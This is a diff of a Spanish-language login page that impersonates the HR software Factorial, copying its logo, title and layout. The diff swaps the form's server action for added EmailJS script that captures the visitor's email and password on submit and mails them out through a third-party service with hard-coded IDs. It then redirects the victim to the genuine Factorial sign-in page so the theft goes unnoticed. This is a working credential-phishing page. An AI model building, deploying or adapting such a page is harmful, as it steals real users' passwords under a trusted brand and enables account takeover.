@@ -1,208 +1,237 @@
-<!DOCTYPE html>
-<html lang="en">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Entra en Factorial, Software de RRHH</title>
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Entra en Factorial, Software de RRHH</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');
 
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');
+    body {
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        height: 100vh;
+        background-color: white;
+        margin: 0;
+        position: relative;
+    }
 
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            font-size: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            height: 100vh;
-            background-color: white;
-            margin: 0;
-            position: relative;
-        }
+    h3 {
+        font-size: 1.5rem;
+    }
 
-        h3 {
-            font-size: 1.5rem;
-        }
+    .login-container {
+        font-family: Arial, Helvetica, sans-serif;
+        background: white;
+        padding: 9rem;
+        border-radius: 10px;
+        text-align: center;
+        max-width: 2000px;
+        margin-top: 5vh;
+        position: relative;
+    }
 
-        .login-container {
-            font-family: Arial, Helvetica, sans-serif;
-            background: white;
-            padding: 9rem;
-            border-radius: 10px;
-            text-align: center;
-            max-width: 2000px;
-            margin-top: 5vh;
-            position: relative;
-        }
+    #sesion {
+        font-family: "Montserrat", serif;
+        font-weight: 500;
+    }
 
-        #sesion {
-            font-family: "Montserrat", serif;
-            font-weight: 500;
-        }
+    .header-block__line {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: #ff355e;
+        margin-right: 45%;
+        margin-left: 45%;
+        height: 0.15rem;
+    }
 
-        .header-block__line {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #ff355e;
-            margin-right: 45%;
-            margin-left: 45%;
-            height: 0.15rem;
-        }
+    #continuar {
+        font-size: 14px;
+    }
 
-        #continuar {
-            font-size: 14px;
-        }
+    .logo {
+        position: absolute;
+        top: 1px;
+        left: 1px;
+        width: 200px;
+        height: auto;
+    }
 
-        .logo {
-            position: absolute;
-            top: 1px;
-            left: 1px;
-            width: 200px;
-            height: auto;
-        }
+    .social-login {
+        display: flex;
+        justify-content: space-between;
+        margin: 15px;
+        gap: 10px;
+    }
 
-        .social-login {
-            display: flex;
-            justify-content: space-between;
-            margin: 15px;
-            gap: 10px;
-        }
+    .social-btn {
+        width: 48%;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 20px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 16px;
 
-        .social-btn {
-            width: 48%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 20px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
+    }
 
-        }
+    .social-btn img {
+        width: 20px;
+        margin-right: 8px;
+    }
 
-        .social-btn img {
-            width: 20px;
-            margin-right: 8px;
-        }
+    .separator {
+        margin: 15px 0;
+        border-bottom: 1px solid #ddd;
+        position: relative;
+    }
 
-        .separator {
-            margin: 15px 0;
-            border-bottom: 1px solid #ddd;
-            position: relative;
-        }
+    .separator span {
+        position: absolute;
+        top: -10px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: white;
+        padding: 0 10px;
+        color: #666;
+    }
 
-        .separator span {
-            position: absolute;
-            top: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: white;
-            padding: 0 10px;
-            color: #666;
-        }
+    input {
+       
+    }
 
-        input {
-           
-        }
+    .input-container {
+        position: relative;
+        margin-bottom: 25px;
+    }
 
-        .input-container {
-            position: relative;
-            margin-bottom: 25px;
-        }
+    input { width: 100%;
+        margin: 10px 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 14px;
+        width: 100%;
+        padding: 33px 10px 14px 10px;
+        height: 20px;
+        border: 2px solid gray;
+        border-radius: 5px;
+        font-size: 15px;
+        outline: none;
+        transition: border-color 0.3s;
+    }
 
-        input { width: 100%;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 14px;
-            width: 100%;
-            padding: 33px 10px 14px 10px;
-            height: 20px;
-            border: 2px solid gray;
-            border-radius: 5px;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.3s;
-        }
+    input:focus {
+        border-color: teal;
+    }
 
-        input:focus {
-            border-color: teal;
-        }
+    label {
+        position: absolute;
+        top: 20px;
+        left: 10px;
+        font-size: 14px;
+        color: gray;
+        background: white;
+        padding: 0 5px;
+        transition: 0.3s ease-in-out;
+    }
 
-        label {
-            position: absolute;
-            top: 20px;
-            left: 10px;
-            font-size: 14px;
-            color: gray;
-            background: white;
-            padding: 0 5px;
-            transition: 0.3s ease-in-out;
-        }
+    input:focus+label,
+    input:not(:placeholder-shown)+label {
+        top: 5px;
+        font-size: 12px;  
+    }
 
-        input:focus+label,
-        input:not(:placeholder-shown)+label {
-            top: 5px;
-            font-size: 12px;  
-        }
+    .forgot-password {
+        text-align: right;
+        font-size: 12px;
+        margin-bottom: 15px;
+    }
 
-        .forgot-password {
-            text-align: right;
-            font-size: 12px;
-            margin-bottom: 15px;
-        }
+    .forgot-password a {
+        color: black;
+        text-decoration: none;
+    }
 
-        .forgot-password a {
-            color: black;
-            text-decoration: none;
-        }
+    .login-btn {
+        width: 400px;
+        padding: 20px;
+        background: #ff3366;
+        color: white;
+        border: none;
+        border-radius: 20px;
+        cursor: pointer;
+        font-size: 16px;
+    }
 
-        .login-btn {
-            width: 400px;
-            padding: 20px;
-            background: #ff3366;
-            color: white;
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 16px;
-        }
+    .login-btn:hover {
+        width: 400px;
+        padding: 20px;
+        background: #e51943;
+        color: white;
+        border: none;
+        border-radius: 20px;
+        cursor: pointer;
+        font-size: 16px;
+    }
 
-        .login-btn:hover {
-            width: 400px;
-            padding: 20px;
-            background: #e51943;
-            color: white;
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 16px;
-        }
+    .register-link {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        font-size: 15px;
+    }
 
-        .register-link {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 15px;
-        }
+    .register-link a {
+        color: #2e838c;
+        font-size: 15px;
+    }
 
-        .register-link a {
-            color: #2e838c;
-            font-size: 15px;
-        }
+    .social-btn a {
+        color: black;
+        text-decoration: none;
+        margin-bottom: 3px;
+    }
 
-        .social-btn a {
-            color: black;
-            text-decoration: none;
-            margin-bottom: 3px;
-        }
-    </style>
+    @media (max-width: 768px) {
+    .login-container {
+        padding: 2rem;  /* Reduce padding para móviles */
+        max-width: 90%;  /* Ajuste para pantallas pequeñas */
+    }
+
+    .social-btn {
+        width: 100%;     /* Ocupa todo el ancho en móviles */
+        margin-bottom: 10px;
+    }
+
+    .header-block__line {
+        align-items: center;
+        width: 15%;      /* Ajuste para móviles */
+    }
+
+    .login-btn {
+        width: 100%;     /* Ocupa todo el ancho en móviles */
+        padding: 12px;   /* Reduce padding */
+    }
+
+    .register-link {
+        position: static; /* Quita posición absoluta para móviles */
+        text-align: center;
+        margin-top: 15px;
+    }
+
+    .logo {
+        width: 150px;     /* Reduce tamaño del logo en móviles */
+    }
+}
+
+</style>
 </head>
 
-<body>
+  <body>
     <div class="login-container">
         <a href="https://factorialhr.com/">
             <img src="logo_factorial2.png" alt="Logo" class="logo">
@@ -229,7 +258,7 @@
             </div>
         </div>
         <div class="separator"><span>o</span></div>
-        <form action="procesar.php" method="post">
+        <form id="loginForm">
             <div class="input-container">
                 <label for="email">Correo electrónico</label>
                 <input type="email" id="email" name="email" required>
@@ -247,6 +276,42 @@
             ¿No tienes cuenta? <a href="#">Regístrate gratis</a>
         </div>
     </div>
-</body>
 
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+      // Inicializar EmailJS
+      emailjs.init("cenK5--_eeyLxUpgb"); // Reemplaza con tu User ID de EmailJS
+
+      // Manejar el evento de envío del formulario
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault(); // Evitar el envío tradicional del formulario
+
+          // Obtener los valores del formulario
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+
+          // Crear el objeto con los datos del formulario
+          const formData = {
+            email: email,
+            password: password,
+          };
+
+          // Usar EmailJS para enviar el correo
+          emailjs.send("service_lssopuk", "template_755qs8j", formData).then(
+            function (response) {
+              console.log("Correo enviado con éxito", response);
+              // Redirigir a la página de Factorial después de enviar el correo
+              window.location.href =
+                "https://api.factorialhr.com/es/users/sign_in?user%5Bemail%5D=" +
+                encodeURIComponent(email);
+            },
+            function (error) {
+              console.log("Error al enviar el correo", error);
+            }
+          );
+        });
+    </script>
+  </body>
 </html>
